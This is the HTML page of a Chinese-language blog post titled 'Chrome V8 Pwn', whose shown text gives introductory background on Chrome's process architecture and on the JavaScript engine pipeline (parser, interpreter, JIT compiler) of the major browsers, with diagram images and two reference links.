<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="sky123">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://skyi23.github.io/2024/11/08/chrome-v8-pwn/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="背景知识浏览器框架它是⼀个多进程+IPC的程序, 不同的进程管理不同的内容,  browser process: 主进程 rander process: 负责控制渲染内容 GPU process: 负责渲染内容 utility process: 标签页进程 plugin process: 插件进程  每个插件, 每个标签页都是单独的进程, 有属于自己的PID JS 引擎各浏览器对应的 js 引擎:">
<meta property="og:type" content="article">
<meta property="og:title" content="Chrome V8 Pwn">
<meta property="og:url" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/index.html">
<meta property="og:site_name" content="sky123">
<meta property="og:description" content="背景知识浏览器框架它是⼀个多进程+IPC的程序, 不同的进程管理不同的内容,  browser process: 主进程 rander process: 负责控制渲染内容 GPU process: 负责渲染内容 utility process: 标签页进程 plugin process: 插件进程  每个插件, 每个标签页都是单独的进程, 有属于自己的PID JS 引擎各浏览器对应的 js 引擎:">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/af6f9e65fe08552b51bf639ba82f56e2.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/2299f6497fe9fbb66cee7b2dea8e0080.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/54722a67135f05d3bacd1edb9f6983c6.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/170339142b19f92b9ced0c15ccc96c6e.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/3ef02f5a22d6de6396d3a5f5eee042c9.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/4616d4c0290a3929b0e388e592a37a8f.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/5a2c7bb9ed7f645604659956c9140f12.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/076214d58c9f667947cff193c11a4953.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/2d9e60b57c9b91542e571dad74d9e54e.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/a9e1104bf1f94c6b840269b8dd3100b5.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/7478b65db9045f2215b821e9a1e2267f.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/aae0870ac00cce5722ced9f43d894b24.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/a1051554575e9c61f1d78692a54147f7.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/cfe38b05694d9aeba1e2732c7f9566db.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/2a1d0f71ecf94af51fcd70c0ff475d20.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/3ae53b580f94b64b7d4b3c08b2c4b409.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/6abb1619281f83f884e392cd9bb9b40d.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/d6c28ea4d12dd171e9d98e68da5b328f.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/4c5ccd404575542afecdabd6829685b5.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/c73ed9e6cf4d28ded671bc1c1e9338fb.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/1183634adb9db86c2a83a979abe4d505.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/593f5ca0dd5af835b2cc59a27f0c560d.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/54ccd1274efaf3d69751016075870e1a.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/a304a5a6054e7c0085783876f4d2f007.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/2c6b74b6162897cfdaeac0710e4ab8fa.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/a9646d8acb9db82a8299671d179052f1.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/fcff33b0bb8c869c3094c13b2e01494b.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/bde9dfcca26eff4e11825181c59cd570.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/1d41626cf74c223f3665480fbbf112b0.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/e43ddd56d83ee56c3634e855f189d296.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/7b4e56651bde606a62ddf04a9ee02d08.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/bd2fa5cad07aa2c49e840d27a3d06d3e.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/e1557fa97f7e301249cd965b402054f1.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/7d32f6a090435f50b55c8bd2e7a8968d.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/27e98fd1fed5dfb781c688b57cddb7eb.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/7729391b287f656bbc54f9168026d770.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/a37f64a6db55de364bcd5330b6b1aa84.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/3b004ce33229326fc2ddc8ce73b1b455.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/84a55035a025b34164f79326f8796c9a.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/2bb3db72d385bb5579b9a37487883e4f.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/491e63bee3aaaeeac28f6f7d934998d8.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/9538d4de1f255ac0725b01321b99bd5e.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/65caf838ed1c9b822d84de2c5345360d.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/faca1aa32ed99db16311c6d4f54a6f24.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/4ec6c1546af4bbefef120695be95d023.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/f36c6062d602d751d82ae1ce88f43769.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/5e33756474098f1771e925e3d38b4e76.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/c31d9c0839fbe94e96957695e0ceb913.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/d34817efdf7ab68e6c3a4130c1043439.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/fb1b9744b7ceb4fef1d8f40eb43d5504.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/31dc3078d810bc5d919b3b19e6e7c3b6.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/e958497f36a9306636a16a77a970e684.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/83f25f19f6050681363a6e709af40184.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/2b4d01cdf3c289241c8526bdf9adbc50.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/40d6aadbb91cf5e7bab20fb3feaa8493.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/4109726cb43700ba2053f1562ad5328f.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/50fae3d29f2265768819de558d98ceff.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/0415a8c76d1fc0c8b4211f2204eaa08f.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/e0a3f6080bea3dacd16e6600bcc983e6.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/44b4d0ced5a0cb04a1d1e7fe92cf71e7.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/876aa00ca9fbf797dad74af35ee24c47.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/a6c3f2f1bcd8d4741db4e01aaf336aa3.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/6cd57cf7655930c41f71d454875b90e6.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/a7757ad400f4a4f570691d1c4507ee2d.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/63d6cecd17d990543b6e936e991dfa82.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/42918fead32d25fc816fe0a7dba91c41.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/fb87e78bdb0c9fe9693a237b34a8d109.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/264e73ea57d5d707a1013a5891774fbe.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/0c6724735e2c145b240a8da0aa242215.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/139e319af448a78ffa14f66d3bf7c35c.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/8cdcf2b6aa25a7360804883f46ff5a74.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/edbbe9d55493f65dce33639849194ccd.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/b1b65b804708e255d79d0fce82703146.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/c4bc8455ef385bb57ce005db778d5460.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/d31d2de344434bb35e75c755d809fb90.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/c0dc4e73512fc049511b2f31a3812b85.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/0b2bc6bda174951f0a1a0a389cb41531.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/be15d33251e5c3e49569356c634286a3.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/3a9c0cb83fc7cfe44978281c40fcacb0.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/be15d33251e5c3e49569356c634286a3.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/94f0d91ba598e5835839fc547519d972.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/d95d1bd2b7158e24a294f4a4d5138ebb.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/6acf64ba4f00381a5b252aac0335a128.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/35b7a940cdd238331c8b0b0141a1c066.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/e56933efd1535fd7f7a43936eeb26928.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/9c774edef143b023790941a7a0d5403b.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/4555ae74d8eb9ad733dcf5009665d5ed.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/0a24359e5f939d4c8551a234cc07e2db.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/d1c0055602cf681c9bd6b3422f61bf99.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/c4f24a562996c0a318aeac9e8ade8c96.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/746bb8d8f277526cbfab70ab11cfa495.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/f1398ecafb6f42b8314fc0e08e429301.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/0a7a5924c3c41c17750ff1d82afe9ef7.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/c715c2cbead24ee0efb738494aecc84b.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/396b253a6f7d07391ea464da03a86df5.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/7237de6f4b9bdc2deda37409e6db7a10.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/94d2fd0ea7b951e9588f1ec29419d91e.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/c566a42eab160a162872551db2cc1e6a.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/eef097251127ec745ec4cc2e5270d715.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/b2df67a234f2cd34bb32397526594f01.png">
<meta property="article:published_time" content="2024-11-08T05:34:18.601Z">
<meta property="article:modified_time" content="2024-11-08T05:38:28.988Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://skyi23.github.io/2024/11/08/Chrome-v8-pwn/images/af6f9e65fe08552b51bf639ba82f56e2.png">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/icon.jpg" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/icon.jpg">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/images/icon.jpg">
    <!--- Page Info-->
    
    <title>
        
            Chrome V8 Pwn | sky123&#39;s site
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/assets/build/styles.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"skyi23.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":"JetBrains Mono","url":"https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap"}},"toc":{"enable":true,"max_depth":4,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"sky123's blog","subtitle":{"text":["书有未曾经我读，事无不可对人言"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"9.3.0"}},"version":"2.7.3","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css" integrity="sha256-TThEtR+XalhWKkfF383YLOrI50NGNeIqrzS+q08afrY=" crossorigin="anonymous"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
<!--        <span class="swup-progress-icon">-->
<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
<!--        </span>-->
    
</div>



<main class="page-container" id="swup">

    

    <div class="main-content-container flex flex-col justify-between min-h-dvh">


        <div class="main-content-header">
            <header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                sky123&#39;s site
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">21</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
    <div class="article-content-container">

        <div class="article-title relative w-full">
            
                <div class="w-full flex items-center pt-6 justify-start">
                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Chrome V8 Pwn</h1>
                </div>
            
            </div>

        
            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
                    <img src="/images/icon.jpg">
                </div>
                <div class="info flex flex-col justify-between">
                    <div class="author flex items-center">
                        <span class="name text-default-text-color text-lg font-semibold">sky123</span>
                        
                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2024-11-08 13:34:18</span>
        <span class="mobile">2024-11-08 13:34:18</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2024-11-08 13:38:28</span>
            <span class="mobile">2024-11-08 13:38:28</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>25.8k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>126 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        


        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
            <h1 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h1><h2 id="浏览器框架"><a href="#浏览器框架" class="headerlink" title="浏览器框架"></a>浏览器框架</h2><p>它是⼀个多进程+IPC的程序, 不同的进程管理不同的内容,</p>
<ul>
<li><code>browser process</code>: 主进程</li>
<li><code>rander process</code>: 负责控制渲染内容</li>
<li><code>GPU process</code>: 负责渲染内容</li>
<li><code>utility process</code>: 标签页进程</li>
<li><code>plugin process</code>: 插件进程<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/af6f9e65fe08552b51bf639ba82f56e2.png"
                      alt="在这里插入图片描述"
                ></li>
</ul>
<p>每个插件, 每个标签页都是单独的进程, 有属于自己的PID<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/2299f6497fe9fbb66cee7b2dea8e0080.png"
                      alt="在这里插入图片描述"
                ></p>
<h2 id="JS-引擎"><a href="#JS-引擎" class="headerlink" title="JS 引擎"></a>JS 引擎</h2><p>各浏览器对应的 js 引擎:</p>
<ul>
<li><code>V8</code> 是 chrome 的 JS Engine ，同时也是 Node.js 的 JS Engine 。V8调试接口非常丰富，基本上可以给你任何你想要的信息。</li>
<li>safari 的 js 引擎是 <code>webkit</code> , 除了 safari , 很多 appstore 的程序也都用 webkit 。</li>
<li>edge 以前用的是 <code>chakracore</code>, 现在用 <code>v8</code> 了。<code>chakracore</code> 几乎已经被淘汰了(代码量小,适合学习)</li>
<li><code>firefox</code> 用的是 <code>spidermonkey</code></li>
</ul>
<h2 id="JS引擎流水线机制"><a href="#JS引擎流水线机制" class="headerlink" title="JS引擎流水线机制"></a>JS引擎流水线机制</h2><p>js 引擎(javascript engine): 处理⼀些 js 语⾔时, 通常是先把网页代码下载下来, 浏览器来解析, 浏览器解析 js 语<br>句, 达到指定的效果, 浏览器可以说是 js 语⾔的解释器.<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/54722a67135f05d3bacd1edb9f6983c6.png"
                      alt="在这里插入图片描述"
                ></p>
<ul>
<li><code>parser</code>:<ul>
<li>将 js 源代码变成 AST(抽象语法树)</li>
<li>检查错误的语法</li>
<li>为生成 bytecode (字节码)做准备</li>
</ul>
</li>
<li><code>interpreter</code>: 解释器, 可以理解成⼀个自定义的虚拟机(⼀个很大很大的 switch case 分支, 对每个 case 有不同的操作符)<ul>
<li>将 AST 转化为 Bytecode</li>
<li>解析执行 Bytecode</li>
<li>和 <code>parser</code> 可以组成⼀个完整的 JS Engine</li>
</ul>
</li>
<li><code>JIT Compiler</code>(<code>optimizing compiler</code>): Just In time编译器<ul>
<li><code>Interpreter</code> 执行 bytecode 很慢, JIT 编译器用于优化”Hot Function”(被执行了很多次的函数, 很热门的函数)</li>
<li>搜集函数调用时的实参类型(因为 js 是⼀个弱类型语言, 所以直接丢给 <code>interpreter</code> 解析时会出现大量分支)</li>
<li>如果收集到了可以被 JIT 优化的代码, 就会被丢到 optmizing compiler 的分支中 让 JIT 做优化,如果后续突然参数类型不⼀样了, 那么就 deoptimize (去优化), 重新执行 bytecode . 然后 bytecode 又可以收集类型.. 然后依次循环。</li>
</ul>
</li>
</ul>
<h2 id="常见-JS-引擎架构"><a href="#常见-JS-引擎架构" class="headerlink" title="常见 JS 引擎架构"></a>常见 JS 引擎架构</h2><ul>
<li><p><code>V8</code>(Chrome)<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/170339142b19f92b9ced0c15ccc96c6e.png"
                      alt="在这里插入图片描述"
                ></p>
</li>
<li><p><code>SpiderMonkey</code>(FireFox)<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/3ef02f5a22d6de6396d3a5f5eee042c9.png"
                      alt="在这里插入图片描述"
                ></p>
</li>
<li><p><code>Chakra Core</code>(Edge)<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/4616d4c0290a3929b0e388e592a37a8f.png"
                      alt="在这里插入图片描述"
                ></p>
</li>
<li><p><code>Webkit</code>(safari)<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/5a2c7bb9ed7f645604659956c9140f12.png"
                      alt="在这里插入图片描述"
                ></p>
</li>
</ul>
<h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><ul>
<li><a class="link"   target="_blank" rel="noopener" href="https://www.blackhat.com/" >漏洞网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://source.chromium.org/" >源码网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
